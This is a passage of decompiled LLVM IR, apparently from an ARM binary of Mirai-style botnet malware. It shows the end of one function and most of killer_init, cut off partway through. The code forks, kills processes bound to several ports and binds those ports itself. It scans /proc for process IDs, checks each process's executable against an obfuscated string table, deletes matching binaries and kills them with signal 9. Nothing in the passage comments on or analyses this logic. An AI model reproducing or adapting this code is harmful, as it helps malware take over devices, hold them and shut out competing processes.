  uselistorder i32 %v1_cb3c, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_cafc, { 0, 2, 1 }
  uselistorder i32 %v0_cafc16, { 1, 0 }
  uselistorder i32 %v1_cac8, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i32 %v3_ca58, { 1, 2, 0 }
  uselistorder i32 %v0_ca00, { 1, 0 }
  uselistorder i32 %v2_c9fc, { 1, 0, 2 }
  uselistorder i8* %v3_c9e4, { 1, 0, 2 }
  uselistorder i32 %v2_c9c4, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8* %stack_var_-585, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-72, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32, i32)* @util_fdgets, { 1, 0 }
  uselistorder label %dec_label_pc_ceac, { 1, 0 }
  uselistorder label %dec_label_pc_ce80, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ce60, { 1, 0 }
  uselistorder label %dec_label_pc_ce54, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ce3c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_cd4c, { 1, 0 }
  uselistorder label %dec_label_pc_cd4cthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_cd34.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_cc50, { 1, 0 }
  uselistorder label %dec_label_pc_cc50.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_cc40.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cbd8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cb80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cb64, { 1, 0 }
  uselistorder label %dec_label_pc_cb08, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_ca6c.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_cabc, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_ca84, { 1, 0 }
  uselistorder label %dec_label_pc_ca28, { 1, 0 }
}

define i32 @killer_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-8480 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-4328 = alloca i32, align 4
  %v3_cf10 = load i32, i32* @r4, align 4
  %v6_cf10 = load i32, i32* @r5, align 4
  %v9_cf10 = load i32, i32* @r6, align 4
  %v12_cf10 = load i32, i32* @r7, align 4
  %v15_cf10 = load i32, i32* @r8, align 4
  %v18_cf10 = load i32, i32* @sb, align 4
  %v21_cf10 = load i32, i32* @sl, align 4
  %v24_cf10 = load i32, i32* @fp, align 4
  %v27_cf10 = load i32, i32* @lr, align 4
  %v2_cf20 = call i32 @__GI_time(i32* null)
  store i32 %v2_cf20, i32* @r7, align 4
  %v0_cf28 = call i32 @__libc_fork()
  %v7_cf2c = icmp eq i32 %v0_cf28, -1
  %. = zext i1 %v7_cf2c to i32
  %tmp136 = icmp slt i32 %v0_cf28, 1
  %storemerge96 = select i1 %tmp136, i32 %., i32 1
  store i32 %storemerge96, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_24d54.70 to i32), i32* %r3.global-to-local, align 4
  %v2_cf48 = icmp eq i32 %storemerge96, 0
  store i32 %v0_cf28, i32* @global_var_24d54.70, align 4
  br i1 %v2_cf48, label %dec_label_pc_cf64, label %dec_label_pc_cf54

dec_label_pc_cf54:                                ; preds = %dec_label_pc_d080, %dec_label_pc_cf64, %entry
  %v1_cf60 = phi i32 [ %v3_d01c, %dec_label_pc_cf64 ], [ %v0_cf28, %entry ], [ 0, %dec_label_pc_d080 ]
  store i32 %v3_cf10, i32* @r4, align 4
  store i32 %v6_cf10, i32* @r5, align 4
  store i32 %v9_cf10, i32* @r6, align 4
  store i32 %v12_cf10, i32* @r7, align 4
  store i32 %v15_cf10, i32* @r8, align 4
  store i32 %v18_cf10, i32* @sb, align 4
  store i32 %v21_cf10, i32* @sl, align 4
  store i32 %v24_cf10, i32* @fp, align 4
  store i32 %v27_cf10, i32* @lr, align 4
  ret i32 %v1_cf60

dec_label_pc_cf64:                                ; preds = %entry
  %v1_cf68 = call i32 @sleep(i32 5)
  store i32 4096, i32* @r0, align 4
  %v0_cf70 = call i32 @malloc()
  store i32 ptrtoint (i32* @global_var_22234.72 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24d50.74 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_cf70, i32* %r2.global-to-local, align 4
  %v0_cf80 = load i32, i32* @r5, align 4
  %v1_cf80 = trunc i32 %v0_cf80 to i8
  %v3_cf80 = inttoptr i32 %v0_cf70 to i8*
  store i8 %v1_cf80, i8* %v3_cf80, align 1
  %v0_cf88 = load i32, i32* @r5, align 4
  %v1_cf88 = load i32, i32* %r3.global-to-local, align 4
  %v2_cf88 = inttoptr i32 %v1_cf88 to i32*
  store i32 %v0_cf88, i32* %v2_cf88, align 4
  %v0_cf8c = load i32, i32* %r2.global-to-local, align 4
  %v1_cf8c = load i32, i32* %r1.global-to-local, align 4
  %v2_cf8c = inttoptr i32 %v1_cf8c to i32*
  store i32 %v0_cf8c, i32* %v2_cf8c, align 4
  %v1_cf90 = call i32 @table_unlock_val(i32 13)
  %v1_cf98 = call i32 @table_unlock_val(i32 14)
  %v2_cfa0 = ptrtoint i32* %stack_var_-4328 to i32
  store i32 %v2_cfa0, i32* %r2.global-to-local, align 4
  %v0_cfa4 = load i32, i32* @r5, align 4
  store i32 %v0_cfa4, i32* %r1.global-to-local, align 4
  %v2_cfb0 = inttoptr i32 %v0_cfa4 to i32*
  %v3_cfb0 = call i32 @table_retrieve_val(i32 13, i32* %v2_cfb0)
  %v1_cfb8 = add i32 %v2_cfa0, -56
  store i32 %v1_cfb8, i32* %r3.global-to-local, align 4
  store i32 %v3_cfb0, i32* %r1.global-to-local, align 4
  store i32 %v1_cfb8, i32* @r0, align 4
  %v2_cfc8 = inttoptr i32 %v1_cfb8 to i8*
  %v3_cfc8 = call i32 @util_strcpy(i8* %v2_cfc8, i32 %v3_cfb0)
  %v2_cfd0 = add i32 %v3_cfc8, %v1_cfb8
  store i32 %v2_cfd0, i32* @r4, align 4
  %v1_cfd4 = call i32 @__getpid(i32 %v3_cfc8)
  %v2_cfdc = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_cfdc, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_cfe4 = trunc i32 %v1_cfd4 to i8
  %v4_cfe4 = call i32 @util_itoa(i8 %v3_cfe4, i32 10, i32 %v2_cfdc)
  store i32 %v4_cfe4, i32* %r1.global-to-local, align 4
  %v0_cfec = load i32, i32* @r4, align 4
  store i32 %v0_cfec, i32* @r0, align 4
  %v2_cff0 = inttoptr i32 %v0_cfec to i8*
  %v3_cff0 = call i32 @util_strcpy(i8* %v2_cff0, i32 %v4_cfe4)
  %v0_cff4 = load i32, i32* @r5, align 4
  store i32 %v0_cff4, i32* %r1.global-to-local, align 4
  %v1_cff8 = load i32, i32* @r4, align 4
  %v2_cff8 = add i32 %v1_cff8, %v3_cff0
  store i32 %v2_cff8, i32* @r4, align 4
  %v2_d000 = inttoptr i32 %v0_cff4 to i32*
  %v3_d000 = call i32 @table_retrieve_val(i32 14, i32* %v2_d000)
  store i32 %v3_d000, i32* %r1.global-to-local, align 4
  %v0_d008 = load i32, i32* @r4, align 4
  store i32 %v0_d008, i32* @r0, align 4
  %v2_d00c = inttoptr i32 %v0_d008 to i8*
  %v3_d00c = call i32 @util_strcpy(i8* %v2_d00c, i32 %v3_d000)
  %v0_d010 = load i32, i32* @r5, align 4
  store i32 %v0_d010, i32* %r1.global-to-local, align 4
  store i32 %v3_d00c, i32* @r6, align 4
  %v2_d01c = inttoptr i32 %v0_d010 to i32*
  %v3_d01c = call i32 @__libc_open(i32 %v1_cfb8, i32* %v2_d01c)
  %v7_d020 = icmp eq i32 %v3_d01c, -1
  br i1 %v7_d020, label %dec_label_pc_cf54, label %dec_label_pc_d028

dec_label_pc_d028:                                ; preds = %dec_label_pc_cf64
  %v1_d028 = call i32 @__GI___libc_close(i32 %v3_d01c)
  %v1_d030 = call i32 @table_lock_val(i32 13)
  %v1_d038 = call i32 @table_lock_val(i32 14)
  store i32 ptrtoint (i32* @global_var_24d50.74 to i32), i32* @lr, align 4
  %v2_d044 = load i32, i32* @global_var_24d50.74, align 4
  store i32 %v2_d044, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d050 = call i32 @readlink(i32 %v1_cfb8, i32 %v2_d044, i32 4095)
  %v7_d054 = icmp eq i32 %v3_d050, -1
  br i1 %v7_d054, label %.thread9, label %bb139

bb139:                                            ; preds = %dec_label_pc_d028
  store i32 ptrtoint (i32* @global_var_24d50.74 to i32), i32* %r1.global-to-local, align 4
  %v3_d05c = load i32, i32* @global_var_24d50.74, align 4
  store i32 %v3_d05c, i32* %r3.global-to-local, align 4
  %v1_d060 = load i32, i32* @r5, align 4
  %v2_d060 = trunc i32 %v1_d060 to i8
  %v5_d060 = add i32 %v3_d05c, %v3_d050
  %v6_d060 = inttoptr i32 %v5_d060 to i8*
  store i8 %v2_d060, i8* %v6_d060, align 1
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_d028, %bb139
  store i32 %v1_cfb8, i32* %r2.global-to-local, align 4
  %v0_d068 = load i32, i32* @r6, align 4
  %v1_d068 = load i32, i32* @r4, align 4
  %v1_cfb8.neg = sub i32 56, %v2_cfa0
  %v2_d068 = add i32 %v1_cfb8.neg, %v0_d068
  %v2_d06c = add i32 %v2_d068, %v1_d068
  store i32 %v2_d06c, i32* @r1, align 4
  store i32 %v1_cfb8, i32* @r0, align 4
  %v0_d074 = call i32 @util_zero()
  %v0_d078 = load i32, i32* @r5, align 4
  store i32 400, i32* @sl, align 4
  %v2_d110 = ptrtoint i32* %stack_var_-304 to i32
  %v2_d380 = ptrtoint i32* %stack_var_-224 to i32
  %v2_d38c = bitcast i32* %stack_var_-224 to i8*
  %v2_d3d0 = ptrtoint i32* %stack_var_-288 to i32
  %v2_d3d4 = bitcast i32* %stack_var_-288 to i8*
  %v2_d520 = ptrtoint i32* %stack_var_-44 to i32
  %v2_d52c = ptrtoint i32* %stack_var_-48 to i32
  %v2_d544 = ptrtoint i32* %stack_var_-8480 to i32
  %v2_d290 = ptrtoint i32* %stack_var_-144 to i32
  %v2_d258 = ptrtoint i32* %stack_var_-128 to i32
  %v2_d220 = ptrtoint i32* %stack_var_-112 to i32
  %v2_d1ec = ptrtoint i32* %stack_var_-96 to i32
  %v2_d1b4 = ptrtoint i32* %stack_var_-80 to i32
  %v2_d16c = ptrtoint i32* %stack_var_-64 to i32
  br label %dec_label_pc_d080

dec_label_pc_d080:                                ; preds = %dec_label_pc_d348, %.thread9
  %stack_var_-8484.0 = phi i32 [ %v0_d078, %.thread9 ], [ %stack_var_-8484.3, %dec_label_pc_d348 ]
  %v1_d084 = call i32 @table_unlock_val(i32 13)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d090 = call i32 @table_retrieve_val(i32 13, i32* null)
  %v1_d094 = call i32 @__GI_opendir(i32 %v3_d090)
  store i32 %v1_d094, i32* @fp, align 4
  %v2_d098 = icmp eq i32 %v1_d094, 0
  br i1 %v2_d098, label %dec_label_pc_cf54, label %dec_label_pc_d0a0

dec_label_pc_d0a0:                                ; preds = %dec_label_pc_d080
  %v1_d0a4 = call i32 @table_lock_val(i32 13)
  %v1_d0b0 = call i32 @killer_kill_by_port(i32 58811)
  %v1_d0bc = call i32 @killer_kill_by_port(i32 add (i32 ptrtoint (i32* @global_var_c700.75 to i32), i32 7))
  %v1_d0c8 = call i32 @killer_kill_by_port(i32 14853)
  %v1_d0d0 = call i32 @killer_kill_by_port(i32 20480)
  %v1_d0dc = call i32 @killer_kill_by_port(i32 47873)
  %v1_d0e8 = call i32 @killer_kill_by_port(i32 ptrtoint (i32* @global_var_e110.77 to i32))
  %v1_d0f4 = call i32 @killer_kill_by_port(i32 2842)
  %v1_d100 = call i32 @killer_kill_by_port(i32 10522)
  %v1_d108 = call i32 @killer_kill_by_port(i32 5632)
  store i32 %v2_d110, i32* @lr, align 4
  store i32 20480, i32* %r3.global-to-local, align 4
  store i32 24465, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d158 = call i32 @socket(i32 2, i32 1, i32 0)
  %v7_d15c = icmp eq i32 %v3_d158, -1
  store i32 %v3_d158, i32* @r4, align 4
  br i1 %v7_d15c, label %dec_label_pc_d184, label %dec_label_pc_d168

dec_label_pc_d168:                                ; preds = %dec_label_pc_d0a0
  store i32 %v2_d16c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d174 = call i32 @bind(i32 %v3_d158, i32 %v2_d16c, i32 16)
  %v0_d178 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d180 = call i32 @listen(i32 %v0_d178, i32 1)
  br label %dec_label_pc_d184

dec_label_pc_d184:                                ; preds = %dec_label_pc_d0a0, %dec_label_pc_d168
  %v1_d188 = call i32 @killer_kill_by_port(i32 5888)
  %v2_d18c = icmp eq i32 %v1_d188, 0
  br i1 %v2_d18c, label %dec_label_pc_d64c, label %dec_label_pc_d194

dec_label_pc_d194:                                ; preds = %dec_label_pc_d670, %dec_label_pc_d660, %dec_label_pc_d64c, %dec_label_pc_d184, %dec_label_pc_d684
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d1a0 = call i32 @socket(i32 2, i32 1, i32 0)
  %v7_d1a4 = icmp eq i32 %v3_d1a0, -1
  store i32 %v3_d1a0, i32* %r4.global-to-local, align 4
  br i1 %v7_d1a4, label %dec_label_pc_d1cc, label %dec_label_pc_d1b0

dec_label_pc_d1b0:                                ; preds = %dec_label_pc_d194
  store i32 %v2_d1b4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d1bc = call i32 @bind(i32 %v3_d1a0, i32 %v2_d1b4, i32 16)
  %v0_d1c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d1c8 = call i32 @listen(i32 %v0_d1c0, i32 1)
  br label %dec_label_pc_d1cc

dec_label_pc_d1cc:                                ; preds = %dec_label_pc_d194, %dec_label_pc_d1b0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d1d8 = call i32 @socket(i32 2, i32 1, i32 0)
  %v7_d1dc = icmp eq i32 %v3_d1d8, -1
  store i32 %v3_d1d8, i32* %r4.global-to-local, align 4
  br i1 %v7_d1dc, label %dec_label_pc_d204, label %dec_label_pc_d1e8

dec_label_pc_d1e8:                                ; preds = %dec_label_pc_d1cc
  store i32 %v2_d1ec, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d1f4 = call i32 @bind(i32 %v3_d1d8, i32 %v2_d1ec, i32 16)
  %v0_d1f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d200 = call i32 @listen(i32 %v0_d1f8, i32 1)
  br label %dec_label_pc_d204

dec_label_pc_d204:                                ; preds = %dec_label_pc_d1cc, %dec_label_pc_d1e8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d210 = call i32 @socket(i32 2, i32 1, i32 0)
  %v7_d214 = icmp eq i32 %v3_d210, -1
  store i32 %v3_d210, i32* %r4.global-to-local, align 4
  br i1 %v7_d214, label %dec_label_pc_d238, label %dec_label_pc_d220

dec_label_pc_d220:                                ; preds = %dec_label_pc_d204
  store i32 %v2_d220, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d228 = call i32 @bind(i32 %v3_d210, i32 %v2_d220, i32 16)
  %v0_d22c = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d234 = call i32 @listen(i32 %v0_d22c, i32 1)
  br label %dec_label_pc_d238

dec_label_pc_d238:                                ; preds = %dec_label_pc_d204, %dec_label_pc_d220
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d244 = call i32 @socket(i32 2, i32 1, i32 0)
  %v7_d248 = icmp eq i32 %v3_d244, -1
  store i32 %v3_d244, i32* %r4.global-to-local, align 4
  br i1 %v7_d248, label %dec_label_pc_d270, label %dec_label_pc_d254

dec_label_pc_d254:                                ; preds = %dec_label_pc_d238
  store i32 %v2_d258, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d260 = call i32 @bind(i32 %v3_d244, i32 %v2_d258, i32 16)
  %v0_d264 = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d26c = call i32 @listen(i32 %v0_d264, i32 1)
  br label %dec_label_pc_d270

dec_label_pc_d270:                                ; preds = %dec_label_pc_d238, %dec_label_pc_d254
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d27c = call i32 @socket(i32 2, i32 1, i32 0)
  %v7_d280 = icmp eq i32 %v3_d27c, -1
  store i32 %v3_d27c, i32* @r4, align 4
  br i1 %v7_d280, label %dec_label_pc_d2a8.preheader, label %dec_label_pc_d28c

dec_label_pc_d28c:                                ; preds = %dec_label_pc_d270
  store i32 %v2_d290, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d298 = call i32 @bind(i32 %v3_d27c, i32 %v2_d290, i32 16)
  %v0_d29c = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d2a4 = call i32 @listen(i32 %v0_d29c, i32 1)
  br label %dec_label_pc_d2a8.preheader

dec_label_pc_d2a8.preheader:                      ; preds = %dec_label_pc_d28c, %dec_label_pc_d270
  %v0_d2a860 = load i32, i32* @fp, align 4
  %v1_d2ac61 = inttoptr i32 %v0_d2a860 to i32*
  %v2_d2ac62 = call i32 @__GI_readdir(i32* %v1_d2ac61)
  %v2_d2b064 = icmp eq i32 %v2_d2ac62, 0
  br i1 %v2_d2b064, label %dec_label_pc_d348, label %dec_label_pc_d2b8.preheader

dec_label_pc_d2b8.preheader:                      ; preds = %dec_label_pc_d2a8.preheader, %dec_label_pc_d2a8.backedge
  %v0_d2b872 = phi i32 [ %v2_d2ac, %dec_label_pc_d2a8.backedge ], [ %v2_d2ac62, %dec_label_pc_d2a8.preheader ]
  %stack_var_-8484.165 = phi i32 [ %stack_var_-8484.1.be, %dec_label_pc_d2a8.backedge ], [ %stack_var_-8484.0, %dec_label_pc_d2a8.preheader ]
  br label %dec_label_pc_d2b8

dec_label_pc_d2b8:                                ; preds = %dec_label_pc_d2b8.preheader, %dec_label_pc_d330
  %v0_d2c8 = phi i32 [ %v2_d33c, %dec_label_pc_d330 ], [ %v0_d2b872, %dec_label_pc_d2b8.preheader ]
  %stack_var_-8484.2 = phi i32 [ %v1_d2dc, %dec_label_pc_d330 ], [ %stack_var_-8484.165, %dec_label_pc_d2b8.preheader ]
  %v1_d2b8 = add i32 %v0_d2c8, 11
  %v2_d2b8 = inttoptr i32 %v1_d2b8 to i8*
  %v3_d2b8 = load i8, i8* %v2_d2b8, align 1
  %v4_d2b8 = zext i8 %v3_d2b8 to i32
  %v1_d2bc = add nsw i32 %v4_d2b8, -48
  store i32 %v1_d2bc, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_d2bc, 9
  br i1 %tmp, label %dec_label_pc_d2a8.backedge, label %dec_label_pc_d2c8

dec_label_pc_d2c8:                                ; preds = %dec_label_pc_d2b8
  store i32 %v1_d2b8, i32* @r6, align 4
  store i32 %v1_d2b8, i32* @r0, align 4
  %v1_d2d0 = call i32 @atol(i32 %v1_d2b8)
  %v0_d2d8 = load i32, i32* @sl, align 4
  %v1_d2dc = add i32 %stack_var_-8484.2, 1
  store i32 %v1_d2d0, i32* @r8, align 4
  %v5_d2e8 = icmp slt i32 %v0_d2d8, %v1_d2d0
  %v2_d358 = call i32 @__GI_time(i32* null)
  br i1 %v5_d2e8, label %dec_label_pc_d354, label %dec_label_pc_d2ec

dec_label_pc_d2ec:                                ; preds = %dec_label_pc_d2c8
  %v0_d2f4 = load i32, i32* @r7, align 4
  %v2_d2f4 = sub i32 %v2_d358, %v0_d2f4
  %v7_d2fc = icmp slt i32 %v2_d2f4, 601
  br i1 %v7_d2fc, label %dec_label_pc_d304, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_d2ec
  store i32 400, i32* @sl, align 4
  br label %dec_label_pc_d2a8.backedge

dec_label_pc_d304:                                ; preds = %dec_label_pc_d2ec
  %v0_d304 = load i32, i32* @r8, align 4
  %v7_d308 = icmp slt i32 %v0_d304, 401
  br i1 %v7_d308, label %dec_label_pc_d2a8.backedge, label %dec_label_pc_d30c

dec_label_pc_d30c:                                ; preds = %dec_label_pc_d304
  store i32 %v1_d2dc, i32* @lr, align 4
  %v3_d314 = zext i32 %v1_d2dc to i64
  %v4_d314 = mul nuw i64 %v3_d314, 3435973837
  %v3_d3181 = udiv i64 %v4_d314, 34359738368
  %v3_d31c3 = mul nuw nsw i64 %v3_d3181, 8
  %v3_d31c = trunc i64 %v3_d31c3 to i32
  store i32 %v3_d31c, i32* %r3.global-to-local, align 4
  %v2_d3205 = mul nuw nsw i64 %v3_d3181, 2
  %v2_d320 = trunc i64 %v2_d3205 to i32
  %v2_d324 = add i32 %v3_d31c, %v2_d320
  store i32 %v2_d324, i32* %r2.global-to-local, align 4
  %v9_d328 = icmp eq i32 %v1_d2dc, %v2_d324
  br i1 %v9_d328, label %dec_label_pc_d330, label %dec_label_pc_d2a8.backedge

dec_label_pc_d330:                                ; preds = %dec_label_pc_d30c
  %v1_d334 = call i32 @sleep(i32 1)
  %v0_d338 = load i32, i32* @fp, align 4
  %v1_d33c = inttoptr i32 %v0_d338 to i32*
  %v2_d33c = call i32 @__GI_readdir(i32* %v1_d33c)
  %v2_d340 = icmp eq i32 %v2_d33c, 0
  br i1 %v2_d340, label %dec_label_pc_d348, label %dec_label_pc_d2b8

dec_label_pc_d348:                                ; preds = %dec_label_pc_d2a8.backedge, %dec_label_pc_d330, %dec_label_pc_d2a8.preheader
  %stack_var_-8484.3 = phi i32 [ %stack_var_-8484.0, %dec_label_pc_d2a8.preheader ], [ %v1_d2dc, %dec_label_pc_d330 ], [ %stack_var_-8484.1.be, %dec_label_pc_d2a8.backedge ]
  %v0_d348 = load i32, i32* @fp, align 4
  %v1_d34c = inttoptr i32 %v0_d348 to i32*
  %v2_d34c = call i32 @__GI_closedir(i32* %v1_d34c)
  br label %dec_label_pc_d080

dec_label_pc_d354:                                ; preds = %dec_label_pc_d2c8
  %v1_d364 = call i32 @table_unlock_val(i32 13)
  %v1_d36c = call i32 @table_unlock_val(i32 14)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d378 = call i32 @table_retrieve_val(i32 13, i32* null)
  store i32 %v2_d380, i32* @sb, align 4
  store i32 %v3_d378, i32* %r1.global-to-local, align 4
  store i32 %v2_d380, i32* @r0, align 4
  %v3_d38c = call i32 @util_strcpy(i8* %v2_d38c, i32 %v3_d378)
  %v1_d390 = load i32, i32* @sb, align 4
  %v2_d390 = add i32 %v1_d390, %v3_d38c
  store i32 %v2_d390, i32* %r5.global-to-local, align 4
  %v0_d394 = load i32, i32* @r6, align 4
  store i32 %v0_d394, i32* %r1.global-to-local, align 4
  store i32 %v2_d390, i32* @r0, align 4
  %v2_d39c = inttoptr i32 %v2_d390 to i8*
  %v3_d39c = call i32 @util_strcpy(i8* %v2_d39c, i32 %v0_d394)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_d39c, i32* %r4.global-to-local, align 4
  %v3_d3ac = call i32 @table_retrieve_val(i32 14, i32* null)
  store i32 %v3_d3ac, i32* %r1.global-to-local, align 4
  %v1_d3b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_d3b4 = add i32 %v1_d3b4, %v3_d39c
  store i32 %v2_d3b4, i32* @r0, align 4
  %v2_d3b8 = inttoptr i32 %v2_d3b4 to i8*
  %v3_d3b8 = call i32 @util_strcpy(i8* %v2_d3b8, i32 %v3_d3ac)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d3c4 = call i32 @table_retrieve_val(i32 13, i32* null)
  store i32 %v3_d3c4, i32* %r1.global-to-local, align 4
  store i32 %v2_d3d0, i32* @r0, align 4
  %v3_d3d4 = call i32 @util_strcpy(i8* %v2_d3d4, i32 %v3_d3c4)
  %v2_d3e0 = add i32 %v3_d3d4, %v2_d3d0
  store i32 %v2_d3e0, i32* @r5, align 4
  store i32 %v2_d3e0, i32* @r0, align 4
  %v0_d3e8 = load i32, i32* @r6, align 4
  store i32 %v0_d3e8, i32* %r1.global-to-local, align 4
  %v2_d3ec = inttoptr i32 %v2_d3e0 to i8*
  %v3_d3ec = call i32 @util_strcpy(i8* %v2_d3ec, i32 %v0_d3e8)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_d3ec, i32* @r4, align 4
  %v3_d3fc = call i32 @table_retrieve_val(i32 29, i32* null)
  store i32 %v3_d3fc, i32* %r1.global-to-local, align 4
  %v0_d404 = load i32, i32* @r4, align 4
  %v1_d404 = load i32, i32* @r5, align 4
  %v2_d404 = add i32 %v1_d404, %v0_d404
  store i32 %v2_d404, i32* @r0, align 4
  %v2_d408 = inttoptr i32 %v2_d404 to i8*
  %v3_d408 = call i32 @util_strcpy(i8* %v2_d408, i32 %v3_d3fc)
  %v1_d410 = call i32 @table_lock_val(i32 13)
  %v1_d418 = call i32 @table_lock_val(i32 14)
  store i32 %v1_cfb8, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d42c = call i32 @readlink(i32 %v2_d380, i32 %v1_cfb8, i32 4095)
  %v7_d430 = icmp eq i32 %v3_d42c, -1
  store i32 %v3_d42c, i32* @r5, align 4
  br i1 %v7_d430, label %dec_label_pc_d4f4, label %dec_label_pc_d43c

dec_label_pc_d43c:                                ; preds = %dec_label_pc_d354
  store i32 %v1_cfb8, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_d444 = add i32 %v3_d42c, %v1_cfb8
  %v5_d444 = inttoptr i32 %v4_d444 to i8*
  store i8 0, i8* %v5_d444, align 1
  %v1_d44c = call i32 @table_unlock_val(i32 30)
  %v0_d450 = load i32, i32* @r4, align 4
  store i32 %v0_d450, i32* %r1.global-to-local, align 4
  %v2_d458 = inttoptr i32 %v0_d450 to i32*
  %v3_d458 = call i32 @table_retrieve_val(i32 30, i32* %v2_d458)
  %v0_d45c = load i32, i32* @r5, align 4
  %v1_d45c = add i32 %v0_d45c, -1
  store i32 %v1_d45c, i32* @r1, align 4
  store i32 %v3_d458, i32* %r2.global-to-local, align 4
  %v4_d468 = call i32 @util_stristr(i8* %v2_cfc8, i32 %v1_d45c, i32 %v3_d458)
  %v7_d46c = icmp eq i32 %v4_d468, -1
  br i1 %v7_d46c, label %dec_label_pc_d488, label %dec_label_pc_d474

dec_label_pc_d474:                                ; preds = %dec_label_pc_d43c
  %v1_d478 = call i32 @unlink(i32 %v1_cfb8)
  %v0_d47c = load i32, i32* @r8, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d484 = call i32 @kill(i32 %v0_d47c, i32 9)
  br label %dec_label_pc_d488

dec_label_pc_d488:                                ; preds = %dec_label_pc_d43c, %dec_label_pc_d474
  %v1_d48c = call i32 @table_lock_val(i32 30)
  %v1_d490 = call i32 @__getpid(i32 %v1_d48c)
  store i32 %v1_d490, i32* @r0, align 4
  %v1_d494 = load i32, i32* @r8, align 4
  %v9_d494 = icmp eq i32 %v1_d490, %v1_d494
  br i1 %v9_d494, label %dec_label_pc_d4c0, label %dec_label_pc_d49c

dec_label_pc_d49c:                                ; preds = %dec_label_pc_d488
  %v0_d49c = call i32 @getppid()
  %v1_d4a0 = load i32, i32* @r8, align 4
  %v9_d4a0 = icmp eq i32 %v0_d49c, %v1_d4a0
  br i1 %v9_d4a0, label %dec_label_pc_d4c0, label %dec_label_pc_d4a8

dec_label_pc_d4a8:                                ; preds = %dec_label_pc_d49c
  store i32 ptrtoint (i32* @global_var_24d50.74 to i32), i32* %r3.global-to-local, align 4
  %v2_d4b0 = load i32, i32* @global_var_24d50.74, align 4
  store i32 %v2_d4b0, i32* %r1.global-to-local, align 4
  %v3_d4b4 = call i32 @util_strcmp(i8* %v2_cfc8, i32 %v2_d4b0)
  %v2_d4b8 = icmp eq i32 %v3_d4b4, 0
